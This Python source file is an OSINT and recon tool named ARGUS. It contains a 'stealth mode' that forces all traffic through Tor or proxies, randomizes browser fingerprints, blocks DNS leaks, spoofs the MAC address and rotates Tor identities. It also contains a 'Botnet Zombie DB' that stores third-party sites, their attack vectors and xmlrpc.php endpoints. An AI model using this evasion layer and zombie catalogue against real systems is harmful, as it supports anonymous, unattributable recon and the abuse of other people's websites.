#!/usr/bin/env python3
"""
ARGUS - All-seeing Recon & General Unified Security
A comprehensive terminal-based OSINT (Open Source Intelligence) tool.
"""

import os
import hashlib
import io
import json
import re
import socket
import ipaddress
import struct
import sys
import time
import gc
import concurrent.futures
import threading
import random
import string
import subprocess
import shutil
from datetime import datetime
from urllib.parse import urlparse, urljoin

try:
    import requests
except ImportError:
    print("[!] 'requests' is required. Install with: pip install requests")
    sys.exit(1)

try:
    from colorama import Fore, Style, init as colorama_init
    colorama_init(autoreset=True)
except ImportError:
    print("[!] 'colorama' is required. Install with: pip install colorama")
    sys.exit(1)

try:
    import whois
except ImportError:
    whois = None

try:
    import dns.resolver
except ImportError:
    dns = None

try:
    from bs4 import BeautifulSoup
except ImportError:
    BeautifulSoup = None

try:
    from PIL import Image
    from PIL.ExifTags import TAGS
except ImportError:
    Image = None
    TAGS = None

try:
    import socks  # PySocks
except ImportError:
    socks = None

try:
    import phonenumbers
    from phonenumbers import geocoder as pn_geocoder
    from phonenumbers import carrier as pn_carrier
    from phonenumbers import timezone as pn_timezone
except ImportError:
    phonenumbers = None

# ─── Color shortcuts ───────────────────────────────────────────────────────────

C = Fore.CYAN
R = Fore.RED
G = Fore.GREEN
Y = Fore.YELLOW
W = Fore.WHITE
M = Fore.MAGENTA
RST = Style.RESET_ALL

VERSION = "5.0.0"

# ─── ASCII Art Banner ──────────────────────────────────────────────────────────

BANNER = rf"""
{C}     █████╗ {R}██████╗ {C} ██████╗ {R}██╗   ██╗{C}███████╗
{C}    ██╔══██╗{R}██╔══██╗{C}██╔════╝ {R}██║   ██║{C}██╔════╝
{C}    ███████║{R}██████╔╝{C}██║  ███╗{R}██║   ██║{C}███████╗
{C}    ██╔══██║{R}██╔══██╗{C}██║   ██║{R}██║   ██║{C}╚════██║
{C}    ██║  ██║{R}██║  ██║{C}╚██████╔╝{R}╚██████╔╝{C}███████║
{C}    ╚═╝  ╚═╝{R}╚═╝  ╚═╝{C} ╚═════╝ {R} ╚═════╝ {C}╚══════╝{RST}

{W}              .-=========-.
{W}          .:-'  {R}({C}o{R}){W}     {R}({C}o{R}){W}  '-:.
{W}         /    .  {Y}\\___/{Y}  {W}.    \\
{W}         '-:.    {M}THE ALL{W}   .:-'
{W}              '-=========-'{RST}

{Y}    ╔══════════════════════════════════════╗
    ║  {W}A R G U S  -  T H E  A L L - S E E R{Y}  ║
    ╚══════════════════════════════════════╝{RST}
{C}        OSINT & Security Recon Toolkit
{W}                  v{VERSION}{RST}
"""

SEPARATOR = f"{C}{'─' * 60}{RST}"

BOTNET_DB = os.path.join(os.path.dirname(os.path.abspath(__file__)), "botnet_zombies.json")

# ─── Stealth Mode ─────────────────────────────────────────────────────────────

STEALTH = {
    "enabled": False,
    "proxy_type": "tor",       # tor | socks5 | http
    "proxy_host": "127.0.0.1",
    "proxy_port": 9050,
    "rotate_ua": True,
}

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14.4; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 OPR/109.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_3; rv:124.0) Gecko/20100101 Firefox/124.0",
]

ACCEPT_LANGUAGES = [
    "en-US,en;q=0.9",
    "en-GB,en;q=0.9",
    "en-US,en;q=0.9,es;q=0.8",
    "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7",
    "de-DE,de;q=0.9,en-US;q=0.8,en;q=0.7",
    "es-ES,es;q=0.9,en;q=0.8",
    "it-IT,it;q=0.9,en-US;q=0.8,en;q=0.7",
    "pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7",
    "ja;q=0.9,en-US;q=0.8,en;q=0.7",
    "zh-CN,zh;q=0.9,en;q=0.8",
]

ACCEPT_HEADERS = [
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
]

ACCEPT_ENCODINGS = [
    "gzip, deflate, br",
    "gzip, deflate",
    "gzip, deflate, br, zstd",
]


def _random_stealth_headers():
    """Generate a full set of randomized browser headers."""
    return {
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": random.choice(ACCEPT_HEADERS),
        "Accept-Language": random.choice(ACCEPT_LANGUAGES),
        "Accept-Encoding": random.choice(ACCEPT_ENCODINGS),
        "DNT": "1",
        "Upgrade-Insecure-Requests": "1",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "none",
        "Sec-Fetch-User": "?1",
        "Connection": "keep-alive",
    }


# ─── Stealth: Monkey-patch requests ──────────────────────────────────────────

_orig_requests_get = requests.get
_orig_requests_post = requests.post
_orig_requests_head = requests.head
_orig_requests_put = requests.put
_orig_requests_delete = requests.delete
_orig_requests_patch = requests.patch
_orig_requests_request = requests.request
_OrigSession = requests.Session


def _stealth_proxy_dict():
    """Build the proxies dict based on current STEALTH config."""
    s = STEALTH
    if s["proxy_type"] in ("tor", "socks5"):
        url = f"socks5h://{s['proxy_host']}:{s['proxy_port']}"
    else:
        url = f"http://{s['proxy_host']}:{s['proxy_port']}"
    return {"http": url, "https": url}


_proxy_health = {"alive": False, "checked_at": 0.0}
_PROXY_CHECK_INTERVAL = 10  # seconds between proxy health checks


def _is_proxy_alive():
    """Cached proxy health check — re-checks every _PROXY_CHECK_INTERVAL seconds."""
    now = time.time()
    if now - _proxy_health["checked_at"] < _PROXY_CHECK_INTERVAL:
        return _proxy_health["alive"]
    alive = _is_port_open(STEALTH["proxy_host"], STEALTH["proxy_port"])
    _proxy_health["alive"] = alive
    _proxy_health["checked_at"] = now
    return alive


def _stealth_request(orig_func, *args, **kwargs):
    """Wrap a requests function to inject proxy and random UA when stealth is on.
    Includes a kill-switch: if stealth is active but the proxy is unreachable,
    the request FAILS instead of silently falling back to a direct connection."""
    if STEALTH["enabled"]:
        # --- Kill-switch: verify proxy is reachable ---
        if STEALTH["proxy_type"] in ("tor", "socks5") and socks is None:
            raise ConnectionError(
                "[STEALTH] PySocks is not installed — cannot route through "
                f"{STEALTH['proxy_type'].upper()}.  Install with: pip install PySocks"
            )
        if not _is_proxy_alive():
            raise ConnectionError(
                f"[STEALTH] Proxy {STEALTH['proxy_host']}:{STEALTH['proxy_port']} "
                f"is unreachable — request blocked to prevent IP leak."
            )
        # --- Inject proxy ---
        if "proxies" not in kwargs:
            kwargs["proxies"] = _stealth_proxy_dict()
        # --- Inject full randomized browser headers (anti-fingerprint) ---
        if STEALTH["rotate_ua"]:
            stealth_hdrs = _random_stealth_headers()
            existing = kwargs.get("headers") or {}
            # Only inject headers the caller didn't set explicitly
            for k, v in stealth_hdrs.items():
                existing.setdefault(k, v)
            kwargs["headers"] = existing
    return orig_func(*args, **kwargs)


requests.get = lambda *a, **kw: _stealth_request(_orig_requests_get, *a, **kw)
requests.post = lambda *a, **kw: _stealth_request(_orig_requests_post, *a, **kw)
requests.head = lambda *a, **kw: _stealth_request(_orig_requests_head, *a, **kw)
requests.put = lambda *a, **kw: _stealth_request(_orig_requests_put, *a, **kw)
requests.delete = lambda *a, **kw: _stealth_request(_orig_requests_delete, *a, **kw)
requests.patch = lambda *a, **kw: _stealth_request(_orig_requests_patch, *a, **kw)
requests.request = lambda *a, **kw: _stealth_request(_orig_requests_request, *a, **kw)


class StealthSession(_OrigSession):
    """Drop-in replacement for requests.Session that injects stealth settings."""

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        if STEALTH["enabled"]:
            self.proxies.update(_stealth_proxy_dict())
            if STEALTH["rotate_ua"]:
                self.headers.update(_random_stealth_headers())

    def request(self, method, url, **kwargs):
        if STEALTH["enabled"]:
            # Kill-switch: same checks as _stealth_request
            if STEALTH["proxy_type"] in ("tor", "socks5") and socks is None:
                raise ConnectionError(
                    "[STEALTH] PySocks not installed — request blocked."
                )
            if not _is_proxy_alive():
                raise ConnectionError(
                    f"[STEALTH] Proxy unreachable — request blocked."
                )
            # Always inject fresh proxy (settings may have changed)
            proxy_dict = _stealth_proxy_dict()
            if "proxies" not in kwargs:
                kwargs["proxies"] = proxy_dict
            self.proxies.update(proxy_dict)
            if STEALTH["rotate_ua"]:
                stealth_hdrs = _random_stealth_headers()
                for k, v in stealth_hdrs.items():
                    self.headers.setdefault(k, v)
        return super().request(method, url, **kwargs)


requests.Session = StealthSession

# ─── Stealth: Monkey-patch socket ────────────────────────────────────────────

_orig_socket = socket.socket


def _activate_socket_proxy():
    """Replace socket.socket with a SOCKS-aware version for TCP connections.
    NEVER silently falls back to a direct connection — blocks instead."""
    if socks is None:
        print(f"  {R}[!] PySocks not installed — socket-level proxying disabled.{RST}")
        print(f"  {R}    Install with: pip install PySocks{RST}")
        return
    s = STEALTH
    if s["proxy_type"] in ("tor", "socks5"):
        ptype = socks.SOCKS5
    else:
        ptype = socks.HTTP
    phost = s["proxy_host"]
    pport = s["proxy_port"]

    class _SmartSocksSocket(_orig_socket):
        """Proxy TCP (SOCK_STREAM) through SOCKS; let RAW/DGRAM pass through
        only with explicit user consent.  NEVER silently falls back.
        Blocks AF_INET6 to prevent IPv6 leaks that bypass SOCKS/Tor."""

        def __init__(self, family=socket.AF_INET, type=socket.SOCK_STREAM,
                     proto=0, fileno=None):
            # Force IPv4: IPv6 bypasses SOCKS/Tor entirely
            if family == socket.AF_INET6:
                family = socket.AF_INET
            super().__init__(family, type, proto, fileno)
            if type == socket.SOCK_STREAM:
                self._stealth_proxy = (ptype, phost, pport, True)
            else:
                self._stealth_proxy = None

        def connect(self, address):
            if self._stealth_proxy:
                # Route TCP through SOCKS — if this fails the exception
                # propagates up, which is INTENTIONAL (no silent fallback).
                ss = socks.socksocket(self.family, self.type, self.proto)
                ss.setproxy(*self._stealth_proxy)
                ss.settimeout(self.gettimeout())
                ss.connect(address)
                os.dup2(ss.fileno(), self.fileno())
                ss.detach()
                return
            # RAW/UDP sockets: user was already warned by
            # _stealth_raw_socket_warning() before reaching here.
            super().connect(address)

    socket.socket = _SmartSocksSocket


def _deactivate_socket_proxy():
    """Restore the original socket.socket."""
    socket.socket = _orig_socket

# ─── Stealth: DNS leak prevention ────────────────────────────────────────────
# Block gethostbyname AND getaddrinfo when stealth is active.
# Proxied connections (requests with socks5h://, PySocks socksocket) resolve
# DNS remotely through the proxy and never call these functions for the
# target hostname, so blocking them only catches *unproxied* lookups that
# would leak the real IP.

_orig_gethostbyname = socket.gethostbyname
_orig_getaddrinfo = socket.getaddrinfo

_LOCALHOST_NAMES = frozenset({"localhost", "127.0.0.1", "::1", "0.0.0.0"})


def _is_local_or_ip(host):
    """Return True if *host* is an IP literal or a localhost alias."""
    host_str = str(host)
    if host_str in _LOCALHOST_NAMES:
        return True
    try:
        ipaddress.ip_address(host_str)
        return True          # already an IP — no DNS needed
    except ValueError:
        return False


def _block_dns_leak(hostname):
    """Block local DNS resolution when stealth is active (prevents IP leak)."""
    if STEALTH["enabled"] and not _is_local_or_ip(hostname):
        raise OSError(
            f"[STEALTH] DNS lookup for '{hostname}' blocked — "
            f"would expose your real IP.  Use proxied connections."
        )
    return _orig_gethostbyname(hostname)


def _block_getaddrinfo_leak(host, port, family=0, type=0, proto=0, flags=0):
    """Block getaddrinfo when stealth is active (prevents IP leak).
    Also forces AF_INET (IPv4) to prevent IPv6 leaks — Tor/SOCKS
    typically don't support IPv6 and it would bypass the proxy."""
    if STEALTH["enabled"]:
        if not _is_local_or_ip(host):
            raise OSError(
                f"[STEALTH] DNS lookup for '{host}' blocked — "
                f"would expose your real IP.  Use proxied connections."
            )
        # Force IPv4: IPv6 bypasses SOCKS/Tor entirely
        if family == 0 or family == socket.AF_INET6:
            family = socket.AF_INET
    return _orig_getaddrinfo(host, port, family, type, proto, flags)


socket.gethostbyname = _block_dns_leak
socket.getaddrinfo = _block_getaddrinfo_leak

# ─── Stealth: Force dns.resolver to use TCP (goes through SOCKS) ────────────
# UDP DNS queries bypass the SOCKS proxy and leak your real IP.
# By forcing TCP mode, dns.resolver queries are routed through the
# monkey-patched socket → SOCKS → Tor, so the DNS server sees the
# exit-node IP, not yours.

if dns is not None:
    try:
        _orig_dns_resolver_resolve = dns.resolver.Resolver.resolve

        def _stealth_dns_resolve(self, *args, **kwargs):
            if STEALTH["enabled"]:
                kwargs.setdefault("tcp", True)
            return _orig_dns_resolver_resolve(self, *args, **kwargs)

        dns.resolver.Resolver.resolve = _stealth_dns_resolve
    except AttributeError:
        pass  # older dnspython without .resolve()

# ─── Stealth: Raw socket bypass warning ─────────────────────────────────────


def _stealth_raw_socket_warning(func_name):
    """Show warning and ask for confirmation when stealth is active and function
    uses RAW/UDP sockets that cannot be proxied."""
    if not STEALTH["enabled"]:
        return True
    print(f"\n  {Y}[!] WARNING: {W}{func_name}{Y} uses RAW/UDP sockets that "
          f"bypass the proxy.{RST}")
    print(f"  {Y}    Your real IP may be exposed during this operation.{RST}")
    ans = input(f"  {Y}    Continue anyway? (y/N):{RST} ").strip().lower()
    return ans == "y"


# ─── Stealth: MAC address spoofing ───────────────────────────────────────────

_ORIGINAL_MAC = {"iface": None, "mac": None}


def _get_active_interface():
    """Detect the primary network interface (the one with the default route)."""
    try:
        result = subprocess.check_output(
            ["ip", "route", "show", "default"],
            text=True, timeout=5
        ).strip()
        parts = result.split()
        if "dev" in parts:
            return parts[parts.index("dev") + 1]
    except Exception:
        pass
    return None


def _get_current_mac(iface):
    """Read the current MAC address of *iface*."""
    try:
        result = subprocess.check_output(
            ["ip", "link", "show", iface], text=True, timeout=5
        )
        for line in result.split("\n"):
            if "link/ether" in line:
                return line.strip().split()[1]
    except Exception:
        pass
    return None


def _generate_random_mac():
    """Generate a random unicast, locally-administered MAC address."""
    first = random.randint(0, 255) & 0xFE | 0x02   # LAA + unicast
    rest = [random.randint(0, 255) for _ in range(5)]
    return ":".join(f"{b:02x}" for b in [first] + rest)


def _spoof_mac():
    """Spoof the MAC of the active interface.  Requires sudo."""
    iface = _get_active_interface()
    if not iface:
        print(f"  {R}[!] Could not detect active network interface.{RST}")
        return False

    current = _get_current_mac(iface)
    if not current:
        print(f"  {R}[!] Could not read MAC for {iface}.{RST}")
        return False

    # Save original only once
    if _ORIGINAL_MAC["mac"] is None:
        _ORIGINAL_MAC["iface"] = iface
        _ORIGINAL_MAC["mac"] = current

    new_mac = _generate_random_mac()
    print(f"  {C}[*] Spoofing MAC on {iface}: {current} -> {new_mac}{RST}")
    try:
        subprocess.check_call(
            ["sudo", "ip", "link", "set", iface, "down"], timeout=10)
        subprocess.check_call(
            ["sudo", "ip", "link", "set", iface, "address", new_mac], timeout=10)
        subprocess.check_call(
            ["sudo", "ip", "link", "set", iface, "up"], timeout=10)
        print(f"  {G}[+] MAC spoofed: {W}{current}{G} -> {W}{new_mac}{G} ({iface}){RST}")
        return True
    except Exception as e:
        print(f"  {R}[!] MAC spoofing failed: {e}{RST}")
        try:
            subprocess.check_call(
                ["sudo", "ip", "link", "set", iface, "up"], timeout=10)
        except Exception:
            pass
        return False


def _restore_mac():
    """Restore the original MAC address saved by _spoof_mac()."""
    if not _ORIGINAL_MAC["mac"] or not _ORIGINAL_MAC["iface"]:
        print(f"  {Y}[*] No original MAC to restore (was not spoofed).{RST}")
        return
    iface = _ORIGINAL_MAC["iface"]
    original = _ORIGINAL_MAC["mac"]
    print(f"  {C}[*] Restoring original MAC on {iface}...{RST}")
    try:
        subprocess.check_call(
            ["sudo", "ip", "link", "set", iface, "down"], timeout=10)
        subprocess.check_call(
            ["sudo", "ip", "link", "set", iface, "address", original], timeout=10)
        subprocess.check_call(
            ["sudo", "ip", "link", "set", iface, "up"], timeout=10)
        print(f"  {G}[+] MAC restored: {W}{original}{G} ({iface}){RST}")
        _ORIGINAL_MAC["mac"] = None
        _ORIGINAL_MAC["iface"] = None
    except Exception as e:
        print(f"  {R}[!] MAC restore failed: {e}{RST}")


# ─── Stealth: Tor circuit rotation ──────────────────────────────────────────

def _tor_new_identity():
    """Send SIGNAL NEWNYM to Tor's ControlPort to get a fresh circuit.
    Requires ControlPort 9051 enabled in /etc/tor/torrc."""
    try:
        s = _orig_socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect(("127.0.0.1", 9051))

        # Try empty-password auth first, then cookie
        s.send(b'AUTHENTICATE ""\r\n')
        resp = s.recv(256)
        if b"250" not in resp:
            s.send(b"AUTHENTICATE\r\n")
            resp = s.recv(256)

        if b"250" not in resp:
            s.close()
            print(f"  {R}[!] Tor ControlPort auth failed.{RST}")
            print(f"  {W}    Add to /etc/tor/torrc:{RST}")
            print(f"  {W}      ControlPort 9051{RST}")
            print(f"  {W}      CookieAuthentication 1{RST}")
            print(f"  {W}    Then: sudo systemctl restart tor{RST}")
            return False

        s.send(b"SIGNAL NEWNYM\r\n")
        resp = s.recv(256)
        s.close()

        if b"250" in resp:
            print(f"  {G}[+] New Tor identity requested.{RST}")
            print(f"  {C}[*] Waiting 5s for new circuit...{RST}")
            time.sleep(5)
            # Show new exit IP
            try:
                r = _orig_requests_get(
                    "https://api.ipify.org?format=json",
                    proxies=_stealth_proxy_dict(),
                    headers={"User-Agent": random.choice(USER_AGENTS)},
                    timeout=20,
                )
                new_ip = r.json().get("ip", "unknown")
                print(f"  {G}[+] New exit IP: {W}{new_ip}{RST}")
            except Exception:
                pass
            return True
        else:
            print(f"  {R}[!] NEWNYM failed: {resp.decode(errors='ignore').strip()}{RST}")
            return False
    except Exception as e:
        print(f"  {R}[!] Cannot connect to Tor ControlPort (9051): {e}{RST}")
        print(f"  {W}    Add to /etc/tor/torrc:{RST}")
        print(f"  {W}      ControlPort 9051{RST}")
        print(f"  {W}      CookieAuthentication 1{RST}")
        print(f"  {W}    Then: sudo systemctl restart tor{RST}")
        return False


# ─── Stealth: auto-verify IP after activation ───────────────────────────────

def _auto_verify_stealth():
    """Automatically verify that the proxy is working after stealth activation.
    If the check fails, offer to disable stealth to prevent accidental leaks."""
    print(f"  {C}[*] Verifying anonymity...{RST}")
    try:
        r = _orig_requests_get(
            "https://api.ipify.org?format=json",
            proxies=_stealth_proxy_dict(),
            headers={"User-Agent": random.choice(USER_AGENTS)},
            timeout=20,
        )
        exit_ip = r.json().get("ip", "unknown")
        print(f"  {G}[+] Identity masked — external IP: {W}{exit_ip}{RST}")
    except Exception as e:
        print(f"  {R}[!] VERIFICATION FAILED: {e}{RST}")
        print(f"  {R}    The proxy may not be working — your real IP could leak!{RST}")
        ans = input(f"  {Y}    Disable stealth for safety? (Y/n):{RST} ").strip().lower()
        if ans != "n":
            STEALTH["enabled"] = False
            _deactivate_socket_proxy()
            print(f"  {Y}[*] Stealth disabled — fix the proxy and try again.{RST}")


# ─── Stealth: configure_stealth() ───────────────────────────────────────────
def _is_port_open(host, port):
    """Check if a local port is open using the ORIGINAL (unpatched) socket,
    so the check works even when _SmartSocksSocket is active."""
    s = _orig_socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(1)
    try:
        s.connect((host, port))
        s.close()
        return True
    except Exception:
        return False

# Helper: Attempt to start Tor using sudo
def _attempt_start_tor():
    if not shutil.which("tor"):
        print(f"  {R}[!] Error: 'tor' is not installed.{RST}")
        return False

    print(f"  {Y}[*] Tor is not running. Attempting to start via systemctl...{RST}")

    try:
        # METODO 1: Prova pulita con systemctl (Consigliato)
        # Non usiamo '&', subprocess.call aspetta che il comando 'start' finisca (è immediato)
        res = subprocess.call(["sudo", "systemctl", "start", "tor"])

        # Se systemctl fallisce (es. non c'è systemd), proviamo il metodo raw
        if res != 0:
            print(f"  {Y}[!] systemctl failed, trying direct execution...{RST}")
            # METODO 2: Esecuzione diretta
            # Usiamo Popen invece di call. Popen NON blocca lo script, quindi
            # agisce come la "&" del terminale senza causare l'errore.
            subprocess.Popen(["sudo", "tor"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        print(f"  {C}[*] Waiting for Tor circuit to initialize (max 30s)...{RST}")
        for i in range(30):
            if _is_port_open("127.0.0.1", 9050):
                print(f"  {G}[+] Tor started successfully!{RST}")
                return True
            time.sleep(1)

        print(f"  {R}[!] Timeout: Tor process exists but port 9050 is not open.{RST}")
        return False
    except Exception as e:
        print(f"  {R}[!] Exception: {e}{RST}")
        return False

def configure_stealth():
    """Interactive menu to configure stealth/proxy settings."""
    while True:
        status = (f"{G}ON{RST} via {W}{STEALTH['proxy_type'].upper()}{RST} "
                  f"({STEALTH['proxy_host']}:{STEALTH['proxy_port']})"
                  if STEALTH["enabled"] else f"{R}OFF{RST}")
        print(f"\n{SEPARATOR}")
        print(f"  {Y}► {W}Stealth Mode Configuration  [{status}]{RST}")
        print(SEPARATOR)
        mac_status = (f"{G}SPOOFED{RST}" if _ORIGINAL_MAC["mac"] else f"{W}Original{RST}")
        print(f"  {C}1.{RST} {W}Enable via Tor (socks5h://127.0.0.1:9050){RST}")
        print(f"  {C}2.{RST} {W}Enable via custom SOCKS5 proxy{RST}")
        print(f"  {C}3.{RST} {W}Enable via custom HTTP proxy{RST}")
        print(f"  {C}4.{RST} {W}Disable Stealth Mode{RST}")
        print(f"  {C}5.{RST} {W}Test connection (check IP via Tor Project){RST}")
        print(f"  {C}6.{RST} {W}Show current external IP{RST}")
        print(f"  {C}7.{RST} {W}Spoof MAC address  [{mac_status}]{RST}")
        print(f"  {C}8.{RST} {W}Restore original MAC{RST}")
        print(f"  {C}9.{RST} {W}New Tor identity (rotate circuit){RST}")
        print(f"  {R}0.{RST} {W}Back to main menu{RST}")
        print(SEPARATOR)

        choice = input(f"  {Y}Select >{RST} ").strip()

        if choice == "0":
            return
        elif choice == "1":
            if socks is None:
                print(f"  {R}[!] PySocks not installed. Run: pip install PySocks{RST}")
                continue

            # --- CHECK AND AUTO-START TOR WITH SUDO ---
            if not _is_port_open("127.0.0.1", 9050):
                success = _attempt_start_tor()
                if not success:
                    print(f"  {R}[!] Could not connect to Tor. Please start it manually:{RST}")
                    print(f"  {R}    Command: sudo service tor start{RST}")
                    continue
            # ------------------------------------------

            STEALTH["enabled"] = True
            STEALTH["proxy_type"] = "tor"
            STEALTH["proxy_host"] = "127.0.0.1"
            STEALTH["proxy_port"] = 9050
            _activate_socket_proxy()
            print(f"  {G}[+] Stealth enabled via Tor (socks5h://127.0.0.1:9050){RST}")
            _auto_verify_stealth()

        elif choice == "2":
            if socks is None:
                print(f"  {R}[!] PySocks not installed. Run: pip install PySocks{RST}")
                continue
            host = input(f"  {Y}SOCKS5 host [127.0.0.1]:{RST} ").strip() or "127.0.0.1"
            port = input(f"  {Y}SOCKS5 port [1080]:{RST} ").strip() or "1080"
            try:
                port = int(port)
            except ValueError:
                print(f"  {R}[!] Invalid port{RST}")
                continue
            STEALTH["enabled"] = True
            STEALTH["proxy_type"] = "socks5"
            STEALTH["proxy_host"] = host
            STEALTH["proxy_port"] = port
            _activate_socket_proxy()
            print(f"  {G}[+] Stealth enabled via SOCKS5 ({host}:{port}){RST}")
            _auto_verify_stealth()
        elif choice == "3":
            host = input(f"  {Y}HTTP proxy host [127.0.0.1]:{RST} ").strip() or "127.0.0.1"
            port = input(f"  {Y}HTTP proxy port [8080]:{RST} ").strip() or "8080"
            try:
                port = int(port)
            except ValueError:
                print(f"  {R}[!] Invalid port{RST}")
                continue
            STEALTH["enabled"] = True
            STEALTH["proxy_type"] = "http"
            STEALTH["proxy_host"] = host
            STEALTH["proxy_port"] = port
            _activate_socket_proxy()
            print(f"  {G}[+] Stealth enabled via HTTP proxy ({host}:{port}){RST}")
            _auto_verify_stealth()
        elif choice == "4":
            STEALTH["enabled"] = False
            _deactivate_socket_proxy()
            _proxy_health["checked_at"] = 0.0   # reset health cache
            if _ORIGINAL_MAC["mac"]:
                _restore_mac()
            print(f"  {Y}[*] Stealth mode disabled{RST}")
        elif choice == "5":
            print(f"  {C}[*] Testing connection...{RST}")
            try:
                # Increased timeout slightly for Tor latency
                r = requests.get("https://check.torproject.org/api/ip", timeout=20)
                data = r.json()
                is_tor = data.get("IsTor", False)
                ip = data.get("IP", "unknown")
                if is_tor:
                    print(f"  {G}[+] Connected via Tor! IP: {ip}{RST}")
                else:
                    print(f"  {Y}[!] NOT using Tor. IP: {ip}{RST}")
            except Exception as e:
                print(f"  {R}[!] Connection test failed: {e}{RST}")
        elif choice == "6":
            print(f"  {C}[*] Checking external IP...{RST}")
            try:
                r = requests.get("https://api.ipify.org?format=json", timeout=15)
                ip = r.json().get("ip", "unknown")
                print(f"  {W}External IP: {G}{ip}{RST}")
            except Exception as e:
                print(f"  {R}[!] Failed to get IP: {e}{RST}")
        elif choice == "7":
            _spoof_mac()
        elif choice == "8":
            _restore_mac()
        elif choice == "9":
            if not STEALTH["enabled"] or STEALTH["proxy_type"] != "tor":
                print(f"  {Y}[!] Tor must be active (option 1) to rotate circuits.{RST}")
            else:
                _tor_new_identity()
        else:
            print(f"  {R}[!] Invalid option{RST}")
# ─── Utility helpers ───────────────────────────────────────────────────────────

def spinner(msg, duration=1.0):
    chars = "⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏"
    end_time = time.time() + duration
    i = 0
    while time.time() < end_time:
        sys.stdout.write(f"\r{C}  {chars[i % len(chars)]} {msg}{RST}")
        sys.stdout.flush()
        time.sleep(0.08)
        i += 1
    sys.stdout.write("\r" + " " * (len(msg) + 10) + "\r")
    sys.stdout.flush()


def print_header(title):
    print(f"\n{SEPARATOR}")
    print(f"{Y}  ► {W}{title}{RST}")
    print(SEPARATOR)


def print_row(key, value):
    print(f"  {C}{key:<22}{RST} {W}{value}{RST}")


def print_ok(msg):
    print(f"  {G}[+]{RST} {msg}")


def print_warn(msg):
    print(f"  {Y}[!]{RST} {msg}")


def print_err(msg):
    print(f"  {R}[-]{RST} {msg}")


def prompt(label="Target"):
    return input(f"\n  {Y}{label}:{RST} ").strip()


def pause():
    input(f"\n  {C}Press Enter to continue...{RST}")


# ─── Botnet Zombie DB ────────────────────────────────────────────────────────

def _botnet_db_load():
    if os.path.exists(BOTNET_DB):
        try:
            with open(BOTNET_DB, "r", encoding="utf-8") as f:
                return json.load(f)
        except (json.JSONDecodeError, IOError):
            return []
    return []


def _botnet_db_save(zombies):
    with open(BOTNET_DB, "w", encoding="utf-8") as f:
        json.dump(zombies, f, indent=2, ensure_ascii=False)


def _botnet_db_add(url, cms, vectors):
    zombies = _botnet_db_load()
    for z in zombies:
        if z["url"] == url:
            z["vectors"] = list(set(z.get("vectors", []) + vectors))
            z["last_seen"] = datetime.now().isoformat()
            z["cms"] = cms
            _botnet_db_save(zombies)
            return
    zombies.append({
        "url": url,
        "cms": cms,
        "vectors": vectors,
        "xmlrpc_url": url.rstrip("/") + "/xmlrpc.php",
        "added": datetime.now().isoformat(),
        "last_seen": datetime.now().isoformat(),
    })
    _botnet_db_save(zombies)


# ─── 1. Username Search ───────────────────────────────────────────────────────

PLATFORMS = {
    "GitHub": "https://github.com/{}",
    "Twitter/X": "https://x.com/{}",
    "Instagram": "https://www.instagram.com/{}/",
    "Reddit": "https://www.reddit.com/user/{}/",
    "TikTok": "https://www.tiktok.com/@{}",
    "Pinterest": "https://www.pinterest.com/{}/",
    "Tumblr": "https://{}.tumblr.com",
    "Medium": "https://medium.com/@{}",
    "DeviantArt": "https://www.deviantart.com/{}",
    "SoundCloud": "https://soundcloud.com/{}",
    "Flickr": "https://www.flickr.com/people/{}",
    "Vimeo": "https://vimeo.com/{}",
    "GitLab": "https://gitlab.com/{}",
    "Keybase": "https://keybase.io/{}",
    "HackerNews": "https://news.ycombinator.com/user?id={}",
    "Steam": "https://steamcommunity.com/id/{}",
    "Twitch": "https://www.twitch.tv/{}",
    "Spotify": "https://open.spotify.com/user/{}",
